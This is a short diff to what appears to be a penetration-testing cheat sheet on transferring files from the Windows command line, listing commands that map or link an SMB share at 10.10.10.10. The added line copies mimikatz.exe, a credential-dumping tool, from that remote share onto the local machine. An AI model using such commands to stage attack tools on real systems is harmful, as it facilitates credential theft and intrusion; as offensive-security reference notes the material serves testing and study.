@@ -225,6 +225,8 @@ https://superuser.com/questions/25538/how-to-download-files-from-command-line-in
 
 `net use Q: \\10.10.10.10\share`
 
+`xcopy \\10.10.10.10\share\mimikatz.exe mimikatz.exe`
+
 `pushd \\10.10.10.10\share`
 
 `mklink /D share \\10.10.10.10\share`
